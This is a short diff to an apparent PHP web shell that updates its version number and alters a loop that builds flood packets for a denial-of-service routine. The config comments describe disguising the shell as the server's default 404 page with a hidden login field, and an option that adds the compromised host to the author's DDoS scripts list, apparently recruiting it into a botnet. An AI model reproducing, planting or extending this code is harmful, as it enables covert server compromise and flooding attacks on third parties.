@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 3.11;
+$version            = 3.12;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -2380,8 +2380,8 @@ function insertAfter(referenceNode, newNode) {
         $data          = "";
         $packets       = 0;
         $maxTime       = time() + $exTime;
-        ;
-        while ($noOfBytes--) {
+        $noOfBytesd = $noOfBytes - 3;
+        while ($noOfBytesd--) {
             $data .= "X";
         }
         $data .= "4o4";
